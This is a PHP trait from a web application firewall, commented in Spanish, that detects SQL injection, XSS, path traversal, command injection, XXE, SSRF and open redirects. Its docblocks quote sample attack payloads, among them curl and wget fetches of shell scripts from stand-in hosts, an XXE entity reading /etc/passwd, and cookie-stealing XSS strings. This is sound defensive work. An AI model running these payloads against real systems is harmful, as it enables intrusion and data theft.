<?php

namespace Core\Security\Waf\Waf;

use Core\WafConfig;

/**
 *  EL ESCUDO
 *
 * Este Trait agrupa todas las funciones de detección de ataques tradicionales (SQLi, XSS, etc.) y la normalización de datos.
 */
trait SecurityDetectionTrait
{
    /**
     * Motor de detección de SQL Injection.
     * * Identifica patrones de UNION SELECT, ataques lógicos (OR 1=1),
     * y funciones de tiempo (SLEEP/BENCHMARK).
     * * @param string $v El valor a evaluar.
     * @return bool True si se detecta un patrón malicioso.
     */
    /**
     * Motor de detección de SQL Injection mejorado.
     *
     * CAMBIOS:
     *  - Pre-normalización que elimina técnicas de ofuscación antes de analizar.
     *  - Nuevos patrones para variantes de evasión modernas.
     *  - Detección de funciones de extracción de datos.
     *  - Detección de stacked queries y operadores lógicos sin espacios.
     */
    protected function sql_injection(string $v): bool
    {
        // CAPA 1: Pre-normalización anti-evasión
        $normalized = $this->normalizeSql($v);

        // CAPA 2: Patrones sobre el texto limpio
        $patterns = [

            // 1. UNION SELECT (incluyendo variantes con paréntesis y sin espacios)
            '/union[\s\/*()]+(?:all[\s\/*()]+)?select/i',

            // 2. Ataques lógicos (OR/AND con comparaciones)
            '/\b(or|and)\b[\s(]*([\'"]?\w+[\'"]?)[\s)]*=[\s(]*\2/i',
            // Variantes sin espacios: OR(1=1), AND(1=1)
            '/\b(or|and)\b\s*\(\s*\d+\s*=\s*\d+\s*\)/i',
            // OR 'a'='a', OR 1=1
            '/\b(or|and)\b\s+[\'"]\w*[\'"]\s*=\s*[\'"]\w*[\'"]/i',

            // 3. Blind SQLi basado en tiempo
            '/(sleep\s*\(|benchmark\s*\(|pg_sleep\s*\(|waitfor\s+delay)/i',

            // 4. Comentarios y terminaciones (al final de sentencia)
            '/(--|\/\*|\*\/|#|;)\s*$/i',
            // Versioned comments de MySQL
            '/\/\*![\d]*\s*(union|select|insert|update|delete|drop)/i',

            // 5. Funciones críticas de manipulación de DB
            '/\b(drop|truncate|delete|insert|update|concat|char|load_file|into\s+outfile)\b/i',

            // 6. Funciones de extracción de datos (nuevas)
            '/\b(group_concat|extractvalue|updatexml|json_extract|xmltype|dbms_pipe)\b/i',

            // 7. Subqueries frecuentes en SQLi avanzado
            '/\b(select|union)\b.{0,30}\b(from|where|having)\b/i',

            // 8. Hexadecimales usados para evadir filtros
            '/0x[0-9a-fA-F]{4,}/',

            // 9. Stacked queries (múltiples sentencias)
            '/;\s*(select|insert|update|delete|drop|truncate|exec|execute)\b/i',

            // 10. CHAR() y codificaciones de funciones
            '/\bchar\s*\(\s*\d+/i',
        ];

        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $normalized)) {
                return true;
            }
        }

        return false;
    }

    /**
     * Pre-normalización específica para detección de SQLi.
     *
     * Elimina técnicas de ofuscación comunes antes de aplicar los patrones,
     * convirtiendo variantes evasivas a su forma canónica detectable.
     *
     * Técnicas neutralizadas:
     *  - Comentarios inline: SELECT → SELECT
     *  - Versioned comments: → SELECT
     *  - Whitespace variations: \t \n \r → espacio
     *  - Paréntesis entre palabras clave: UNION(SELECT → UNION SELECT
     *  - Signos + como separador: SELECT+FROM → SELECT FROM
     */
    private function normalizeSql(string $value): string
    {
        // 1. Eliminar comentarios inline MySQL: /**/ entre palabras
        $clean = preg_replace('/\/\*.*?\*\//s', '', $value);

        // 2. Eliminar versioned comments: /*!50000 ... */
        $clean = preg_replace('/\/\*!\d*\s*(.*?)\s*\*\//s', '$1', $clean);

        // 3. Normalizar whitespace (tabs, newlines, returns → espacio)
        $clean = preg_replace('/[\t\r\n\x0B\x0C]+/', ' ', $clean);

        // 4. Eliminar paréntesis usados como separadores entre palabras clave SQL
        // UNION(SELECT → UNION SELECT
        $clean = preg_replace('/\b(union|select|from|where|and|or)\s*\(\s*/i', '$1 (', $clean);

        // 5. Normalizar + como espacio (técnica de evasión en URLs)
        $clean = str_replace('+', ' ', $clean);

        // 6. Colapsar espacios múltiples
        $clean = preg_replace('/\s{2,}/', ' ', $clean);

        return trim($clean);
    }

    /**
     * Detecta posibles intentos de Cross-Site Scripting (XSS) en una cadena.
     *
     * El ataque XSS ocurre cuando un atacante inyecta código JavaScript u otros
     * scripts maliciosos en una aplicación web con el objetivo de ejecutarlos
     * en el navegador de otros usuarios. Esto puede permitir robo de cookies,
     * secuestro de sesión o manipulación del DOM.
     *
     * Esta función utiliza una expresión regular para detectar patrones
     * comúnmente utilizados en ataques XSS, incluyendo:
     *
     * 1. Etiquetas <script>
     * 2. Protocolo javascript:
     * 3. Atributos de eventos HTML (onload=, onclick=, onerror=, etc.)
     * 4. Funciones JavaScript usadas frecuentemente en pruebas o exploits:
     *      - alert()
     *      - confirm()
     * 5. Acceso a cookies mediante document.cookie
     *
     * Ejemplos de payloads detectados:
     *
     *      <script>alert(1)</script>
     *      javascript:alert(1)
     *      <img src=x onerror=alert(1)>
     *      <body onload=alert(1)>
     *      <script>document.cookie</script>
     *
     * Si se detecta alguno de estos patrones, la función devuelve `1` (true),
     * indicando un posible intento de XSS.
     *
     * Ejemplo de uso dentro del WAF:
     *
     *      if ($this->xss($input)) {
     *          $this->addRiskScore($this->ip, 15, 'xss_attempt');
     *      }
     *
     * @param string $v Valor de entrada a analizar (GET, POST, URI, headers, etc).
     *
     * @return int|false
     *         - 1 si se detecta un patrón sospechoso de XSS.
     *         - 0 o false si no se detecta.
     */
    protected function xss($v)
    {
        return preg_match('/(<script|javascript:|on\w+\s*=|alert\(|confirm\(|document\.cookie)/i', $v);
    }

    /**
     * Detecta posibles intentos de Path Traversal en una cadena.
     *
     * El ataque de Path Traversal (también conocido como Directory Traversal)
     * intenta acceder a archivos fuera del directorio permitido utilizando
     * secuencias como "../" o "..\" para navegar hacia directorios superiores.
     *
     * Este tipo de ataque se utiliza comúnmente para intentar acceder a archivos
     * sensibles del sistema como:
     *
     *      /etc/passwd
     *      /etc/shadow
     *      C:\Windows\system.ini
     *      C:\Windows\win.ini
     *
     * La función busca patrones típicos utilizados para subir en la estructura
     * de directorios:
     *
     *      ../   (Unix/Linux)
     *      ..\   (Windows)
     *
     * Ejemplos de payloads detectados:
     *
     *      ../../etc/passwd
     *      ../../../config.php
     *      ..\..\Windows\system32\drivers\etc\hosts
     *
     * Si se detecta alguno de estos patrones, la función devuelve `1` (true),
     * indicando un posible intento de Path Traversal.
     *
     * Ejemplo de uso dentro del WAF:
     *
     *      if ($this->path_traversal($input)) {
     *          $this->addRiskScore($this->ip, 15, 'path_traversal_attempt');
     *      }
     *
     * @param string $v Valor de entrada que se desea analizar (GET, POST, URI, etc).
     *
     * @return int|false
     *         - 1 si se detecta un patrón de path traversal.
     *         - 0 o false si no se detecta.
     */
    protected function path_traversal($v)
    {
        return preg_match('/(\.\.\/|\.\.\\\\)/', $v);
    }

    /**
     * Detecta posibles intentos de Command Injection en un valor dado.
     *
     * Esta función analiza una cadena buscando patrones típicos usados en
     * ataques de inyección de comandos del sistema operativo. Estos ataques
     * intentan ejecutar comandos del sistema a través de entradas no validadas
     * en formularios, parámetros GET/POST, headers, etc.
     *
     * La detección se basa en una expresión regular que busca:
     *
     * 1. Comandos comunes del sistema utilizados en ataques:
     *      - cat
     *      - ls
     *      - whoami
     *      - pwd
     *      - curl
     *      - wget
     *
     * 2. Seguidos de operadores típicos de ejecución o encadenamiento de comandos:
     *      - ;
     *      - |
     *      - `
     *      - >
     *
     * Ejemplos de payloads detectados:
     *
     *      cat /etc/passwd;
     *      ls -la | grep root
     *      whoami`
     *      curl http://attacker.com/shell.sh;
     *      wget http://evil.com/malware.sh
     *
     * Si se detecta un patrón sospechoso, la función devuelve `1` (true),
     * indicando un posible intento de inyección de comandos.
     *
     * Ejemplo de uso en el WAF:
     *
     *      if ($this->command_injection($input)) {
     *          $this->addRiskScore($this->ip, 15, 'command_injection_attempt');
     *      }
     *
     * @param string $v Valor a analizar (entrada del usuario).
     *
     * @return int|false
     *         - 1 si se detecta un patrón sospechoso.
     *         - 0 o false si no se detecta.
     */
    protected function command_injection($v)
    {
        return preg_match('/\b(cat|ls|whoami|pwd|curl|wget)\b.*[;|\||`|>]/i', $v);
    }

    /**
     * Detecta ataques XXE (XML External Entity Injection).
     *
     * XXE permite a un atacante leer archivos del servidor (/etc/passwd),
     * hacer SSRF interno o causar DoS mediante expansión de entidades.
     * Aplica si tu app acepta XML en cualquier endpoint.
     *
     * Payloads detectados:
     *   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
     *   <!ENTITY % xxe PUBLIC "..." "http://attacker.com/evil.dtd">
     */
    protected function xxe(string $v): bool
    {
        return (bool)preg_match(
            '/<!(?:DOCTYPE|ENTITY)[^>]*(?:SYSTEM|PUBLIC)\s+["\'][^"\']*["\']/i',
            $v
        );
    }

    /**
     * Detecta ataques SSRF (Server-Side Request Forgery).
     *
     * SSRF permite a un atacante hacer que el servidor realice peticiones
     * a recursos internos: metadata de cloud, servicios internos, loopback.
     *
     * Rangos bloqueados:
     *   - 127.x.x.x / ::1         → loopback
     *   - 169.254.x.x             → metadata AWS/GCP/Azure
     *   - 10.x / 172.16-31.x / 192.168.x → redes privadas
     *   - 0.0.0.0                 → cualquier interfaz local
     */
    protected function ssrf(string $v): bool
    {
        return (bool)preg_match(
            '/(https?:\/\/)(localhost|127\.|169\.254\.|10\.|192\.168\.|0\.0\.0\.0|::1)/i',
            $v
        );
    }

    /**
     * Detecta intentos de Open Redirect.
     *
     * Un atacante usa parámetros como ?redirect=https://evil.com
     * para redirigir usuarios legítimos a sitios de phishing.
     * El patrón ignora URLs del propio dominio.
     */
    protected function open_redirect(string $v): bool
    {
        // Detecta URLs absolutas externas en parámetros
        // No bloquea rutas relativas (/dashboard) ni anclas (#section)
        return (bool)preg_match(
            '/(?:^|[\?&=\s])(?:https?:)?\/\/(?!(?:www\.)?profitsportclub\.com)[a-z0-9\-\.]+\.[a-z]{2,}/i',
            $v
        );
    }



    /**
     * Normaliza una entrada para facilitar la detección de payloads maliciosos.
     *
     * Muchos ataques web utilizan técnicas de evasión como:
     *  - URL encoding múltiple
     *  - HTML entities
     *  - Null bytes
     *  - estructuras complejas (arrays)
     *
     * Esta función intenta convertir la entrada a una forma "normalizada"
     * antes de aplicar reglas de detección (XSS, SQLi, Command Injection, etc.).
     *
     * Proceso de normalización:
     *
     * 1. Si el valor es un array:
     *    - Se convierte a JSON para poder analizarlo como string.
     *
     * 2. Decodificación múltiple (hasta 3 veces):
     *    - `urldecode()` → detecta payloads codificados como:
     *          %3Cscript%3E
     *          ..%2F..%2Fetc/passwd
     *
     *    - `html_entity_decode()` → detecta entidades HTML como:
     *          &lt;script&gt;
     *
     *    Esto se repite 3 veces para manejar casos de doble o triple encoding
     *    usados frecuentemente para evadir filtros de seguridad.
     *
     * 3. Eliminación de Null Bytes:
     *    - Algunos ataques utilizan `\0` o `0x00` para truncar strings
     *      o evadir comparaciones.
     *
     * Ejemplos de normalización:
     *
     *      "%253Cscript%253Ealert(1)%253C/script%253E"
     *      → "%3Cscript%3Ealert(1)%3C/script%3E"
     *      → "<script>alert(1)</script>"
     *
     *      "..%252f..%252fetc/passwd"
     *      → "..%2f..%2fetc/passwd"
     *      → "../../etc/passwd"
     *
     * Esta función es clave para mejorar la efectividad de las reglas
     * de detección del WAF.
     *
     * @param mixed $value Valor de entrada (string o array).
     *
     * @return string
     *      Valor normalizado listo para ser analizado por las reglas de seguridad.
     */
    /**
     * Normaliza una entrada para maximizar la detección de payloads maliciosos.
     *
     * CAMBIOS:
     *  - Cobertura de Unicode escaping (\uXXXX y %uXXXX).
     *  - Cobertura de HTML entities numéricas decimales y hexadecimales.
     *  - Eliminación de caracteres de control (0x01-0x1F).
     *  - Normalización de separadores whitespace alternativos.
     *  - Eliminación de comentarios SQL inline antes del análisis.
     *  - Orden de decodificación correcto para mixed encoding.
     *  - Protección contra input excesivamente largo (DoS).
     */
    protected function normalize($value): string
    {
        // Protección básica contra DoS por inputs masivos
        if (is_array($value)) {
            $value = json_encode($value);
        }

        // Truncamos a 10KB para evitar que la normalización se convierta
        // en un vector de DoS por CPU en payloads artificialmente largos
        $clean = substr((string)$value, 0, WafConfig::NORMALIZE_MAX_INPUT_BYTES);

        // CAPA 1: Decodificación múltiple (URL encoding y HTML entities)
        // Se repite 3 veces para cubrir double/triple encoding
        for ($i = 0; $i < 3; $i++) {
            // URL decode estándar: %3C →
            $clean = urldecode($clean);

            // IIS-style Unicode encoding: %u0053 → S
            $clean = $this->decodeIisUnicode($clean);

            // HTML entities decimales y hexadecimales: &#60; &#x3C; →
            $clean = html_entity_decode($clean, ENT_QUOTES | ENT_HTML5, 'UTF-8');
        }

        // CAPA 2: Unicode escaping JavaScript/JSON: \u003c →
        $clean = $this->decodeUnicodeEscapes($clean);

        // CAPA 3: Eliminar caracteres de control invisibles (0x00-0x1F excepto espacios)
        // Estos se usan para fragmentar payloads y evadir detección
        $clean = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $clean);

        // CAPA 4: Null bytes en todas sus formas
        $clean = str_replace(['\0', "\x00", '%00', '\u0000'], '', $clean);

        // CAPA 5: Normalizar whitespace alternativo → espacio estándar
        // Tabs, newlines, carriage returns y otros separadores invisibles
        // son usados frecuentemente para evadir patrones que buscan espacios
        $clean = preg_replace('/[\t\r\n\x0B\x0C\xA0]+/', ' ', $clean);

        // CAPA 6: Eliminar comentarios SQL inline
        // SEL/**/ECT → SELECT  (ya cubierto en normalizeSql pero lo anticipamos aquí)
        $clean = preg_replace('/\/\*.*?\*\//s', '', $clean);

        // CAPA 7: Colapsar espacios múltiples resultado de las limpiezas anteriores
        $clean = preg_replace('/\s{2,}/', ' ', $clean);

        return trim($clean);
    }

    /**
     * Decodifica Unicode escaping estilo JavaScript/JSON.
     *
     * Convierte secuencias \uXXXX a sus caracteres UTF-8 equivalentes.
     * Usado en ataques XSS como: \u003cscript\u003e → <script>
     *
     * @param string $value
     * @return string
     */
    private function decodeUnicodeEscapes(string $value): string
    {
        return preg_replace_callback(
            '/\\\\u([0-9a-fA-F]{4})/',
            fn($matches) => mb_chr(hexdec($matches[1]), 'UTF-8'),
            $value
        );
    }

    /**
     * Decodifica Unicode encoding estilo IIS (%uXXXX).
     *
     * IIS históricamente aceptaba este formato no estándar.
     * Algunos WAFs legacy no lo cubren.
     * Ejemplo: %u0053ELECT → SELECT
     *
     * @param string $value
     * @return string
     */
    private function decodeIisUnicode(string $value): string
    {
        return preg_replace_callback(
            '/%u([0-9a-fA-F]{4})/i',
            fn($matches) => mb_chr(hexdec($matches[1]), 'UTF-8'),
            $value
        );
    }

}